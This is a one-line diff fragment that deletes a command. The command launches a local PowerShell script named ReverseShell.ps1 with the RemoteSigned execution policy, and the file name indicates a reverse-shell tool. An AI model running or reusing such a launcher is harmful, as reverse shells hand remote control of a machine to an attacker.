@@ -1,1 +1,0 @@
-Powershell.exe -executionpolicy remotesigned -File C:\kaas\ReverseShell.ps1
